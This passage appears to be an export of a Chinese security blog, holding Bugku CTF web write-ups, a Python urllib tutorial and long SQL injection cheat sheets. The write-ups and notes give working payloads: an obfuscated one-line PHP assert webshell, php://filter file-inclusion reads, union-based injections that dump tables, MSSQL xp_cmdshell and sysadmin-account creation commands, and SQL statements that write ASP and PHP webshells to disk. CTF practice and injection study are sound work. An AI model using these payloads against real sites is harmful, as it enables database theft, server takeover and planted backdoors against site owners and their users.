123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112QNKCDZO0e830400451993494058024219903391s878926199a0e545993274517709034328855841020s155964671a0e342768416822451524974117254469s214587387a0e848240448830537924465865611904s214587387a0e848240448830537924465865611904s878926199a0e545993274517709034328855841020s1091221200a0e940624217856561557816327384675s1885207154a0e509367213418206700842008763514s1502113478a0e861580163291561247404381396064s1885207154a0e5093672134182067008420087635140e861580163291561247404381396064s1885207154a0e509367213418206700842008763514s1836677006a0e481036490867661113260034900752s155964671a0e342768416822451524974117254469s1184209335a0e072485820392773389523109082030s1665632922a0e731198061491163073197128363787s1502113478a0e861580163291561247404381396064s1836677006a0e481036490867661113260034900752s1091221200a0e940624217856561557816327384675s155964671a0e342768416822451524974117254469s1502113478a0e861580163291561247404381396064s155964671a0e342768416822451524974117254469s1665632922a0e731198061491163073197128363787s155964671a0e342768416822451524974117254469s1091221200a0e940624217856561557816327384675s1836677006a0e481036490867661113260034900752s1885207154a0e509367213418206700842008763514s532378020a0e220463095855511507588041205815s878926199a0e545993274517709034328855841020s1091221200a0e940624217856561557816327384675s214587387a0e848240448830537924465865611904s1502113478a0e861580163291561247404381396064s1091221200a0e940624217856561557816327384675s1665632922a0e731198061491163073197128363787s1885207154a0e509367213418206700842008763514s1836677006a0e481036490867661113260034900752s1665632922a0e731198061491163073197128363787s878926199a0e545993274517709034328855841020 抓包测试得到flag{md5_collision_is_easy}]]></content>
      <categories>
        <category>WriteUp</category>
      </categories>
      <tags>
        <tag>Bugku</tag>
        <tag>MD5</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[WP-Bugku-前女友(SKCTF)]]></title>
    <url>%2F2018%2F08%2F08%2FWriteup%2FbugkuWeb%2FWP-Bugku-%E5%89%8D%E5%A5%B3%E5%8F%8B(SKCTF)%2F</url>
    <content type="text"><![CDATA[题目链接:http://118.89.219.210:49162/ 打开题目后有一堆文字，查看源码，有一个链接，点进去后得到源码: 123456789101112&lt;?phpif(isset($_GET['v1']) &amp;&amp; isset($_GET['v2']) &amp;&amp; isset($_GET['v3']))&#123; $v1 = $_GET['v1']; $v2 = $_GET['v2']; $v3 = $_GET['v3']; if($v1 != $v2 &amp;&amp; md5($v1) == md5($v2))&#123; if(!strcmp($v3, $flag))&#123; echo $flag; &#125; &#125;&#125;?&gt; 在PHP中，MD5是不能处理数组的，md5(数组)会返回null，所以md5(a[])==null,md5(b[])==null，md5(a[])=md5(b[])=null,这样就得到答案了。 所以构造出参数:?v1[]=1&amp;v2[]=2&amp;v3[]=3url:http://118.89.219.210:49162/?v1[]=1&amp;&amp;v2[]=2&amp;&amp;v3[]=3 得到SKCTF{Php_1s_tH3_B3St_L4NgUag3} 这里链接一道也是利用数组的题]]></content>
      <categories>
        <category>WriteUp</category>
      </categories>
      <tags>
        <tag>php</tag>
        <tag>Bugku</tag>
        <tag>正则表达式</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[WP-Bugku-字符?正则?]]></title>
    <url>%2F2018%2F08%2F08%2FWriteup%2FbugkuWeb%2FWP-Bugku-%E5%AD%97%E7%AC%A6-%E6%AD%A3%E5%88%99%2F</url>
    <content type="text"><![CDATA[题目代码: 12345678&lt;?php highlight_file('2.php');$key='KEY&#123;********************************&#125;';$IM= preg_match("/key.*key.&#123;4,7&#125;key:\/.\/(.*key)[a-z][[:punct:]]/i", trim($_GET["id"]), $match);if( $IM )&#123; die('key is: '.$key);&#125;?&gt; 可以看到/key.*key.{4,7}key:\/.\/(.*key)[a-z][[:punct:]]/i这一串正则表达式(关于正则点这里)能够构造出:?id=key1key22222key:/3/keyz; 构造url:http://120.24.86.145:8002/web10/?id=key1key22222key:/3/keyz; 得到KEY{0x0SIOPh550afc} ### 正则表达的整理: 1.表达式直接写出来的字符串直接利用，如key 2.“.”代表任意字符 3.“*”代表一个或一序列字符重复出现的次数，即前一个字符重复任意次，这里可以是0次，还有就是以'^'开头，以'$'结束 4.“\/”代表“/”，一种转义，因为单独的//代表着正则的开始与结束 5.[a-z]代表a-z中的任意一个字符 6.[[:punct:]]代表任意一个字符，包括各种符号，记得是符号 7./i代表大小写不敏感 8.{4-7}代表[0-9]中数字连续出现的次数是4-7次 9.\s匹配任意的空白符 10.\d 匹配数字 11.\b 匹配单词的开始或结束]]></content>
      <categories>
        <category>WriteUp</category>
      </categories>
      <tags>
        <tag>php</tag>
        <tag>Bugku</tag>
        <tag>正则表达式</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[WP-Bugku-过狗一句话]]></title>
    <url>%2F2018%2F08%2F08%2FWriteup%2FbugkuWeb%2FWP-Bugku-%E8%BF%87%E7%8B%97%E4%B8%80%E5%8F%A5%E8%AF%9D%2F</url>
    <content type="text"><![CDATA[题目地址:http://120.24.86.145:8010/ 送给大家一个过狗一句话:&lt;?php $poc=&quot;a#s#s#e#r#t&quot;;$poc_1=explode(&quot;#&quot;,$poc);$poc_2=$poc_1[0].$poc_1[1].$poc_1[2].$poc_1[3].$poc_1[4].$poc_1[5];$poc_2($_GET[&#39;s&#39;])?&gt; 搜索到的几种解法: 1. s=print_r(scandir(‘./‘)) http://120.24.86.145:8010/?s=print_r(scandir(&#39;./&#39;)) 2. s=print_r(glob(&quot;*.*&quot;)) http://120.24.86.145:8010/?s=print_r(glob(&quot;*.*&quot;))scandir()函数: scandir() 函数返回指定目录中的文件和目录的数组。glob()函数:glob() 函数返回匹配指定模式的文件名或目录。该函数返回一个包含有匹配文件 / 目录的数组。如果出错返回 false。]]></content>
      <categories>
        <category>WriteUp</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>sql注入</tag>
        <tag>Bugku</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python3抓取页面内容]]></title>
    <url>%2F2018%2F08%2F08%2Fpython3%E6%8A%93%E5%8F%96%E9%A1%B5%E9%9D%A2%E5%86%85%E5%AE%B9%2F</url>
    <content type="text"><![CDATA[环境:python3 最简单123import urllib.requestresponse = urllib.request.urlopen('http://python.org/')html = response.read() 使用request1234567891011121314151617#! /usr/bin/env python3 from urllib.request import Request, urlopenfrom urllib.error import URLErrorreq = Request("http://twitter.com/")try: response = urlopen(req)except URLError as e: if hasattr(e, 'reason'): print('We failed to reach a server.') print('Reason: ', e.reason) elif hasattr(e, 'code'): print('The server couldn\'t fulfill the request.') print('Error code: ', e.code)else: print("good!") print(response.read().decode("utf8")) 发送数据1234567891011121314151617181920#! /usr/bin/env python3 import urllib.parseimport urllib.request url = 'http://localhost/login.php'user_agent = 'Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)'values = &#123; 'act' : 'login', 'login[email]' : 'yzhang@i9i8.com', 'login[password]' : '123456' &#125; data = urllib.parse.urlencode(values)req = urllib.request.Request(url, data)req.add_header('Referer', 'http://www.python.org/')response = urllib.request.urlopen(req)the_page = response.read() print(the_page.decode("utf8")) 发送数据和header1234567891011121314151617181920#! /usr/bin/env python3 import urllib.parseimport urllib.request url = 'http://localhost/login.php'user_agent = 'Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)'values = &#123; 'act' : 'login', 'login[email]' : 'yzhang@i9i8.com', 'login[password]' : '123456' &#125;headers = &#123; 'User-Agent' : user_agent &#125; data = urllib.parse.urlencode(values)req = urllib.request.Request(url, data, headers)response = urllib.request.urlopen(req)the_page = response.read() print(the_page.decode("utf8")) HTTP错误12345678910#! /usr/bin/env python3 import urllib.request req = urllib.request.Request('http://www.python.org/fish.html')try: urllib.request.urlopen(req)except urllib.error.HTTPError as e: print(e.code) print(e.read().decode("utf8")) 异常处理112345678910111213141516#! /usr/bin/env python3 from urllib.request import Request, urlopenfrom urllib.error import URLError, HTTPErrorreq = Request("http://twitter.com/")try: response = urlopen(req)except HTTPError as e: print('The server couldn\'t fulfill the request.') print('Error code: ', e.code)except URLError as e: print('We failed to reach a server.') print('Reason: ', e.reason)else: print("good!") print(response.read().decode("utf8")) 异常处理21234567891011121314151617#! /usr/bin/env python3 from urllib.request import Request, urlopenfrom urllib.error import URLErrorreq = Request("http://twitter.com/")try: response = urlopen(req)except URLError as e: if hasattr(e, 'reason'): print('We failed to reach a server.') print('Reason: ', e.reason) elif hasattr(e, 'code'): print('The server couldn\'t fulfill the request.') print('Error code: ', e.code)else: print("good!") print(response.read().decode("utf8")) HTTP认证12345678910111213141516171819202122232425262728#! /usr/bin/env python3 import urllib.request # create a password managerpassword_mgr = urllib.request.HTTPPasswordMgrWithDefaultRealm() # Add the username and password.# If we knew the realm, we could use it instead of None.top_level_url = "https://cms.tetx.com/"password_mgr.add_password(None, top_level_url, 'yzhang', 'cccddd') handler = urllib.request.HTTPBasicAuthHandler(password_mgr) # create "opener" (OpenerDirector instance)opener = urllib.request.build_opener(handler) # use the opener to fetch a URLa_url = "https://cms.tetx.com/"x = opener.open(a_url)print(x.read()) # Install the opener.# Now all calls to urllib.request.urlopen use our opener.urllib.request.install_opener(opener) a = urllib.request.urlopen(a_url).read().decode('utf8')print(a) 使用代理1234567891011#! /usr/bin/env python3 import urllib.request proxy_support = urllib.request.ProxyHandler(&#123;'sock5': 'localhost:1080'&#125;)opener = urllib.request.build_opener(proxy_support)urllib.request.install_opener(opener) a = urllib.request.urlopen("http://g.cn").read().decode("utf8")print(a) 超时1234567891011121314#! /usr/bin/env python3 import socketimport urllib.request # timeout in secondstimeout = 2socket.setdefaulttimeout(timeout) # this call to urllib.request.urlopen now uses the default timeout# we have set in the socket modulereq = urllib.request.Request('http://twitter.com/')a = urllib.request.urlopen(req).read()print(a)]]></content>
      <categories>
        <category>Learning</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>抓取页面内容</tag>
        <tag>脚本</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[WP_Bugku_变量1]]></title>
    <url>%2F2018%2F08%2F08%2FWriteup%2FbugkuWeb%2FWP-Bugku-%E5%8F%98%E9%87%8F1%2F</url>
    <content type="text"><![CDATA[参考文章:https://blog.csdn.net/anjiaowangmenghan/article/details/76460872 题目地址:http://120.24.86.145:8004/index1.php 12345678910111213flag In the variable ! &lt;?php error_reporting(0);include "flag1.php";highlight_file(__file__);if(isset($_GET['args']))&#123; $args = $_GET['args']; if(!preg_match("/^\w+$/",$args))&#123; die("args error!"); &#125; ");&#125;?&gt; 注意最后的eval(&quot;var_dump($$args);参数args前有两个$$参考下面:所以只需要传一个全局变量就好构url:http://120.24.86.145:8004/index1.php?args=GLOBALS得到flag{92853051ab894a64f7865cf3c2128b34}]]></content>
      <categories>
        <category>WriteUp</category>
      </categories>
      <tags>
        <tag>php</tag>
        <tag>Bugku</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[WP-Bugku-sql注入2]]></title>
    <url>%2F2018%2F08%2F08%2FWriteup%2FbugkuWeb%2FWP-Bugku-sql%E6%B3%A8%E5%85%A52%2F</url>
    <content type="text"><![CDATA[题目地址:http://120.24.86.145:8007/web2/ 这道题是DS_Store源码泄露常见Web源码泄露总结ds_store_exp下载用DS_Store_exp扫描改网址:进入http://120.24.86.145:8007/web2/flag下载得到flag{sql_iNJEct_comMon3600!}]]></content>
      <categories>
        <category>WriteUp</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>Bugku</tag>
        <tag>DS_Store源码泄露</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PHP函数漏洞]]></title>
    <url>%2F2018%2F08%2F08%2FPHP%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E%2F</url>
    <content type="text"><![CDATA[偶然看见网上总结比较全面的PHP函数漏洞，先码住传送门:https://blog.csdn.net/qq_35078631/article/details/75200157]]></content>
      <tags>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[WP-Bugku-flag在index里]]></title>
    <url>%2F2018%2F08%2F08%2FWriteup%2FbugkuWeb%2FWP-Bugku-flag%E5%9C%A8index%E9%87%8C%2F</url>
    <content type="text"><![CDATA[题目地址: http://120.24.86.145:8005/post/ 进入题目后看到只有一个可点击的文字点击之后跳转到http://120.24.86.145:8005/post/index.php?file=show.php 想到题目是:flag在index里那么可能是文件包含构造url:http://120.24.86.145:8005/post/index.php?file=php://filter/read=convert.base64-encode/resource=index.php得到了一串base64加密的字符串base64解密得到包含flag的代码得到flag{edulcni_elif_lacol_si_siht}]]></content>
      <categories>
        <category>WriteUp</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>Bugku</tag>
        <tag>文件包含</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[sqlmap常规使用]]></title>
    <url>%2F2018%2F08%2F08%2Fsqlmap%E5%B8%B8%E8%A7%84%E4%BD%BF%E7%94%A8%2F</url>
    <content type="text"><![CDATA[]]></content>
      <categories>
        <category>Learning</category>
      </categories>
      <tags>
        <tag>笔记</tag>
        <tag>Web</tag>
        <tag>sqlmap</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SQL手工注入常用语句]]></title>
    <url>%2F2018%2F08%2F07%2FSQL%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E5%B8%B8%E7%94%A8%E8%AF%AD%E5%8F%A5%2F</url>
    <content type="text"><![CDATA[文章来源:暗组 判断数据库类型:Access:and (select id from MSysAccessObjects) &gt;0 返回正常说明是access MSSQL:and (select id from sysobjects) &gt;0 返回正常说明是mssql MySQL:and length(user())&gt;0 返回正常说明是MySQL mysql: 1.判断版本 and ord(mid(version(),1,1))&gt;51 /* 返回正常说明是4.0以上版本，可以用union查询2.利用order by 暴字段，在网址后加 order by 10 /* 如果返回正常说明字段大于103.再利用union来查询准确字段，如: order by 或者and 1=2 union select 1,2,3,……./直到返回正常，说明猜到准确字段数。如过滤了空格可以用/**/代替。4.判断数据库连接帐号有没有写权限，and (select count() from mysql.user)&gt;0 /如果结果返回错误，那我们只能猜解管理员帐号和密码了。5.如果返回正常，则可以通过and 1=2 union select 1,2,3,4,5,6,load_file(char(文件路径的ascii值，用逗号隔开)),8,9,10 / 注:load_file(char(文件路径的ascii值，用逗号隔开))也可以用十六进制，通过这种方式读取配置文件，找到数据库连接等。 6、检测是不是root权限 and/*/ord(mid(user(),1,1))=114/ 7、mysql内置函数hex()转换字符为16进制，如select hex(user())mysql内置函数unhex() 解码16进制，如select unhex(hex(user())) 8、mysql内置函数concat()将多列合并成一列，如select concat(username,0x3A,password) from t_member 9、常用内置函数使用:select system_user() 查看系统用户 select current_user() 查询当前用户 select user() 查询用户 SELECT version() 查询数据库版本 SELECT database() 查询当前连接的数据库 select @@version_compile_os 查询当前操作系统 select @@datadir 查询读取数据库路径select @@basedir 查询MYSQL安装路径 ———————-淫荡的分割线——————————————— 去掉limit 1,1为查询出所有行，第一个数字代表查询第几个，第二个数字代表一次查询出的数量第一个数字从1开始递增，查询到3时浏览器返回错误，说明存在2个库/表。 10、查数据库数量union select cuncat(schema_name,0x3A) from information_schema.schemata limit 1,1 11、查询表union select table_name from information_schema.tables where table_schema =库名 limit 1,1 MSSQL: 检测是否为SA权限and 1=(select IS_SRVROLEMEMBER(‘sysadmin’));– 检测是否为DB权限and 1=(Select IS_MEMBER(‘db_owner’)) 爆所有数据库 union select name from master.dbo.sysdatabases where dbid=1 1代表第一个库 爆所有表第一张表 union select top 1 name from 库名.dbo.sysobjects where xtype=’U’ 第二张表 union select top 1 name from 库名.dbo.sysobjects where xtype=’U’ and name not in(‘第一张表’) 第三张表 union select top 1 name from 库名.dbo.sysobjects where xtype=’U’ and name not in(‘第一张表’,’第二张表’)… 爆列:爆ID select id from seay.dbo.sysobjects where xtype=’U’ and name=’admin’ 爆第一个列 select top 1 name from seay.dbo.syscolumns where id=ID号 爆第二个列 select top 1 name from seay.dbo.syscolumns where id=ID号 and name not in(‘第一个列’)… 爆数据:select 列名 from 表名 exec master.dbo.xp_dirtree ‘c:&#39;; 遍历目录exec master.dbo.xp_availablemedia;– 获得当前所有驱动器exec master.dbo.xp_subdirs ‘c:&#39;;– 获得子目录列表exec master.dbo.xp_dirtree ‘c:&#39;;– 获得所有子目录的目录树结构exec master.dbo.xp_cmdshell ‘type c:\web\web.config’;– 查看文件的内容 备份数据库:backup database 库名 to disk=’c:/l.asp’; MSSQL内置函数:select @@version 查询数据库版本 select user_name() 查询当前数据库连接用户名 select db_name() 查询当前数据库名 更改sa密码exec sp_password NULL,’新密码’,’sa’ 添加SA权限用户exec sp_addlogin ‘username’,’pass’,’master’;exec sp_addsrvrolemember ‘username’, sysadmin 检测是否支持多行;declare @d int;– 停掉或激活某个服务。 exec master..xp_servicecontrol ‘stop’,’schedule’exec master..xp_servicecontrol ‘start’,’schedule’ 解开压缩档。 xp_unpackcab ‘c:\test.cab’,’c:\temp’,1 恢复 xp_cmdshell;exec master..dbo.sp_addextendedproc ‘xp_cmdshell’,’xplog70.dll’;– 开启沙盘模式:exec master..xp_regwrite ‘HKEY_LOCAL_MACHINE’,’SOFTWARE\Microsoft\Jet\4.0\Engines’,’SandBoxMode’,’REG_DWORD’,1]]></content>
      <categories>
        <category>Learning</category>
      </categories>
      <tags>
        <tag>SQL</tag>
        <tag>笔记</tag>
        <tag>Web</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[WP-Bugku-成绩单]]></title>
    <url>%2F2018%2F08%2F05%2FWriteup%2FbugkuWeb%2FWP-Bugku-%E6%88%90%E7%BB%A9%E5%8D%95%2F</url>
    <content type="text"><![CDATA[题目地址:http://120.24.86.145:8002/chengjidan/ 进入这道题目 我们先手遍历一遍id=-1&#39; union select 1,2,3,4# 发现有四个表且都有回显 于是 就开始爆破吧 通过id=-1&#39; union select 1,2,3,database()#得到数据库名字skctf_flag 之后通过id=-1&#39; union select 1,2,3,group_concat(table_name) from information_schema.tables where table_schema=database()#得到表名fl4g,sc 关于mysql中group_concat(),information_schema 很显然我们需要的数据在fl4g这个表里 接下来我们就要爆字段了 通过id=-1&#39; union select 1,2,3,group_concat(column_name) from information_schema.columns where table_name=0x666c3467#//这里需要用16进制绕过得到字段skctf_flag 关于用16进制绕过(引号绕过)以及详细资料 最后我们就可以开始查询数据了 通过id=-1&#39; union select 1,2,3,skctf_flag from fl4g#得到BUGKU{Sql_INJECT0N_4813drd8hz4} mysql中的information_schema 结构用来存储数据库系统信息 information_schema 结构中这几个表存储的信息，在注射中可以用到的几个表。 | SCHEMATA ――&gt;存储数据库名的， |——&gt;关键字段:SCHEMA_NAME，表示数据库名称 | TABLES ――&gt;存储表名的 |——&gt;关键字段:TABLE_SCHEMA表示表所属的数据库名称； TABLE_NAME表示表的名称 | COLUMNS ――&gt;存储字段名的 |——&gt;关键字段:TABLE_SCHEMA表示表所属的数据库名称； TABLE_NAME表示所属的表的名称 COLUMN_NAME表示字段名 可以看到，我们只要通过注射点构造查询语句遍相关字段，就可以得到我们想要的信息了。 爆所有数据名 select group_concat(SCHEMA_NAME) from information_schema.schemata 得到当前库的所有表 select group_concat(table_name) from information_schema.tables where table_schema=database() 得到表中的字段名 将敏感的表进行16进制编码adminuser=0x61646D696E75736572 select group_concat(column_name) from information_schema.columns where table_name=0x61646D696E75736572 得到字段具体的值select group_concat(username,0x3a,password) from adminuser ![](https://i.imgur.com/0iK9fkN.png)]]></content>
      <categories>
        <category>WriteUp</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>sql注入</tag>
        <tag>Bugku</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[常规SQL注入笔记]]></title>
    <url>%2F2018%2F07%2F25%2F%E5%B8%B8%E8%A7%84SQL%E6%B3%A8%E5%85%A5%E7%AC%94%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[转载自http://599985375.lofter.com/post/1d071723_7b32422 基本常识简单判定有无漏洞: 粗略型:提交单引号’ 逻辑型(数字型注入):and 1=1/and 1=2 逻辑型(字符型注入):’ and ‘1’=’1/‘ and ‘1’=’2 逻辑型(搜索型注入):%’ and 1=1 and ‘%’=’%/%’ and 1=2 and ‘%’=’% 简单判断数据库信息:粗略型: 加单引号’(根据服务器报错的信息来判断) 加;–(;表示分离，– 则是注释符，;和–MSSQL数据库有，ACCESS数据库没有) 逻辑型: and user&gt;0 and (select count(*) from msysobjects)&gt;0 ……(页面错误为access数据库) and (select count(*) from sysobjects)&gt;0 ……(页面正常为MSSQL数据库) and db_name()&gt;0 ……(爆数据库名) and version&gt;0(爆SQLServer版本信息以及服务器操作系统的类型和版本信息) 判断MYSQL权限: and 0&lt;&gt;(Select ISSRVROLEMEMBER(‘sysadmin’))–(页面正常则为SA) and 0&lt;&gt;(Select IS_MEMBER(‘db_owner’))–(页面正常则为db_owner) and 0&lt;&gt;(Select IS_MEMBER(‘public’))–(页面正常则是public) 注意: 以上方法适用于参数是int数字型的时候。若为字符型，需在参数后添加单引号'并在查询语句后添加;--，搜索型注入以此类推。 ACCESS注入基本流程:猜解表名: and 0&lt;&gt;(select count(*) from 表名) 或 and exists(Select * from 表名) 猜解字段: and exists(Select 字段名 from 表名)(页面正常存在该字段，不正常不存在该字段) 猜解用户名和密码长度: and(Select top 1 len(列名) from 表名)&gt;N(TOP表示把最前面的一条记录提取出来；N为变换猜解的列长度，页面错误即说明该列长度为N)如: and 1=(select count(*) from user where len(name)&gt;6) 错误 and 1=(select count(*) from user where len(name)&gt;5) 正确则表示user表中name字段的第一条记录的长度是6。 猜解用户名和密码: and (select top 1 asc(mid(列名,1,1)) from 表名)&gt;0如: and (select top 1 asc(mid(name,1,1)) from user)&gt;96 页面正常 and (select top 1 asc(mid(name,1,1)) from user)&gt;97 页面错误则表示user表中name字段的第一条记录的第一个字符的ASCLL码为97 注意: 因为MD5的密文长度通常有16位、18位、32位、40位等几种， 所以猜解密码的时候试一试15、16、17、18、31、32、39、40等长度可以加快猜解进度。 MSSQL报错注入基本流程:爆出表名和字段:having 1=1– 猜解表名: 获得第一个表名:and (select top 1 name from sysobjects where xtype=’u’)&gt;0 获得第二个表名:and (select top 1 name from sysobjects where xtype=’u’ and name not in (‘user’))&gt;0 以此类推。 猜解列名: 得到col_name表中的第一个列名:and (select top 1 col_name(object_id(‘字段’),1) from sysobjects)&gt;0 猜解字段内容:and (select top 1 列名 from [表名])&gt;0 如: 获取用户名:and (select top 1 username from [admin])&gt;0 获取密码:and (select top 1 password from [admin])&gt;0 导出webshell: 方法1:利用SQL执行命令功能导出WebShell SELECT ‘&lt;%execute request(“a”)%&gt;’ into [vote] in ‘d:webx.asp;.xls’ ‘excel 8.0;’ from vote 注意:需拥有SQL执行权限且知道绝对路径 方法2: 建立一个有一个A字段的表 表名为a，字段类型为字符，长度为50。 在表A的a字段插入一句话木马，把表a的内容导出为物理路径的一个EXCEL文件。 导出为EXCEL后在利用IIS解析漏洞就可以变成webshell了。 方法2的SQL语句: create table cmd (a varchar(50)) insert into cmd (a) values (‘&lt;%execute request(“listentide”)%&gt;’) select * into [a] in ‘f:hostqhdyxtweba.asp;.xls’ ‘excel 4.0;’ from cmd drop table cmd MYSQL注入基本流程:MYSQL注入漏洞是否存在的判断方法与ACCESS注入和MSSQL注入相同。 MYSQL注入漏洞的数据库类型判断方法也可以使用单引号’。 数据库权限判断:and ord(mid(user(),1,1))=114 /* (页面正常说明为root) 判断当前页面字段总数: 方法1、用union联合查询:and 1=1 union select 1,2,3,4,5…… 方法2、用order by 查询“order by *– 判断显示位: 方法1、http://www.f4ck.org/article.php?id=1 and 1=2 union select 1,2,3,4,5,6,7…… 方法2、http://www.f4ck.org/article.php?id=-1 union select 1,2,3,4,5,6,7…… 查库: 版本大于5.0的mysql的information_schema库中存储着mysql的所有数据库和表结构信息，所以可以利用information_schema库快速注入。 获取第一个库名:and 1=2 union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1 获取第二个库名:and 1=2 union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 1,2 以此类推。 查表: 获取数据库中第一个表名:and 1=2 union select 1,2,3,TABLE_NAME,5,6,7,8,9,10 from information_schema.TABLES where TABLE_SCHEMA=数据库名的十六进制 limit 0,1 获取数据库中第二个表名:and 1=2 union select 1,2,3,TABLE_NAME,5,6,7,8,9,10 from information_schema.TABLES where TABLE_SCHEMA=数据库名的十六进制 limit 1,2 查列: 获取数据库中指定表的第一个列名:and 1=2 Union select 1,2,3,COLUMN_NAME,5,6,7,8,9,10 from information_schema.COLUMNS where TABLE_NAME=表名的十六进制 limit 0,1 获取数据库中指定表的第二个列名:and 1=2 Union select 1,2,3,COLUMN_NAME,5,6,7,8,9,10 from information_schema.COLUMNS where TABLE_NAME=表名的十六进制 limit 0,1 得到字段内容: 在不同的显示位显示不同的字段内容:and 1=2 Union select 1,2,3,用户名段,5,6,7,密码段,8,9 from 表名 limit 0,1 在同一个显示位显示不同的字段内容:and 1=2 Union select 1,2,3concat(用户名段,0x3c,密码段),5,6,7,8,9 from 表名 limit 0,1 一次性查出所有表名:union select 1,2,3,4,GROUP_CONCAT(DISTINCT table_name),6 from information_schema.columns where table_schema=数据库名的16进制 一次性查出所有字段名:union select 1,2,3,4,GROUP_CONCAT(DISTINCT column_name),6 from information_schema.columns where table_schema=数据库名的16进制 导出一句话WebShell: 方法1: Drop TABLE IF EXISTS temp; Create TABLE temp(cmd text NOT NULL); Insert INTO temp (cmd) VALUES(‘’); Select cmd from temp into out file ‘F:/wwwroot/eval.php’; Drop TABLE IF EXISTS temp; 方法2: Select ‘’ into outfile ‘F:/wwwroot/eval.php’; load_file() 常用路径: c:/windows/system32/inetsrv/MetaBase.xml 查看IIS的虚拟主机配置文件 /etc/httpd/conf/httpd.conf或/usr/local/apche/conf/httpd.conf 查看linux APACHE虚拟主机配置文件 c:/Program Files/Apache Group/Apache/conf/httpd.conf 或C:/apache/conf/httpd.conf 查看WINDOWS系统apache的配置文件 c:/Resin-3.0.14/conf/resin.conf查看jsp开发的网站 resin文件配置信息]]></content>
      <categories>
        <category>Learning</category>
      </categories>
      <tags>
        <tag>SQL</tag>
        <tag>笔记</tag>
        <tag>Web</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Web常见漏洞及分析]]></title>
    <url>%2F2018%2F07%2F22%2FWeb%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%88%86%E6%9E%90%2F</url>
    <content type="text"><![CDATA[XSS 漏洞(Cross Site Script | 跨站脚本)常见危害: 盗取用户信息，钓鱼，制造蠕虫等概念: 黑客通过“ Html 注入”篡改网页，插入了恶意脚本，当用户在浏览网页时，实现控制用户浏览器的一种攻击方式 XSS 通常有三种类型: 存储型:访问网站，触发XSS。firebug 的 html 中查找 黑客端攻击流程: 构造带有 XSS 脚本的留言内容 –&gt; 提交给后端 web 应用程序 –&gt; web 应用程序将带有 XSS 脚本的留言写入数据库 –&gt; 用户或管理员查看留言触发 XSS用户端被攻击流程: 用户打开浏览器 –&gt; 访问了有 XSS 脚本的留言页面 –&gt; 浏览器请求内容 –&gt; 查询数据库 –&gt; 数据库将带有 XSS 脚本的留言返回给 web 应用程序 –&gt; 显示在用户的页面中触发 XSS例:留言中加入 &lt;img src=&quot;#&quot; onerrror=alert(/XSS/)&gt; 反射性:访问携带 XSS 脚本的连接，触发 XSS 用户端被攻击流程: 用户访问了有XSS脚本的链接 –&gt; 浏览器向后端的web应用程序发送请求 –&gt; 后端程序将 url 中的 XSS 脚本数据写入到响应页面并返回给浏览器 –&gt; 浏览器渲染响应页面触发 XSS例: url 中携带 &lt;img src=&quot;#&quot; onerror=&quot;alert=(/XSS/)&quot;&gt; DOM 型: 访问携带 XSS 脚本的链接，触发XSSfirebug 脚本中查找“ hash ” 攻击过程: 用户在浏览器中访问携带XSS脚本的链接 –&gt; 浏览器通过 javascript 从 url 中提取出 XSS 脚本的内容并写入到 DOM 中 –&gt; 触发 XSS CSRF 漏洞(Cross-site request forgery | 跨站请求伪造)常见危害: 执行恶意操作(“被转账”、“被发垃圾评论”)，制造蠕虫等概念: 利用用户已登录的身份，在用户毫不知情的情况下，以用户的名义完成非法操作。原理:在转账页面可能存在看不见的 iframe 标签，因为 width 和 height 为0 URL 跳转漏洞概念: 借助未验证的 URL 跳转，将应用程序引导到不安全的第三方区域，从而导致安全问题例如:实现方式: Header 头跳转 JavaScript 跳转 Meta 跳转 SQL 注入SQL 注入是一种常见的Web安全漏洞，攻击者利用这个漏洞，可以进行访问或修改数据，或者利用潜在的数据库漏洞进行攻击SQL 注入的必备条件 1、可以控制输入的数据 2、服务器要执行的代码拼接了控制的数据 SQL 注入的本质 数据和代码未分离，即数据当作了代码来执行 命令注入命令注入要满足三个条件: 1、调用可执行系统命令的函数 2、函数或函数的参数可控 3、拼接注入命令PHP执行命令的函数:system, exec, shell_exec, eval ……PHP执行系统命令的函数: system() 输出并返回最后一行shell结果。exec() 不输出结果，返回最后一行shell结果，所有结果可以保存到一个返回的数组里面。passthru() 只调用命令，把命令的运行结果原样地直接输出到标准输出设备上。]]></content>
      <categories>
        <category>Learning</category>
      </categories>
      <tags>
        <tag>Web</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[submit text 3初始配置]]></title>
    <url>%2F2018%2F07%2F13%2Fsubmit-text-3%E5%88%9D%E5%A7%8B%E9%85%8D%E7%BD%AE%2F</url>
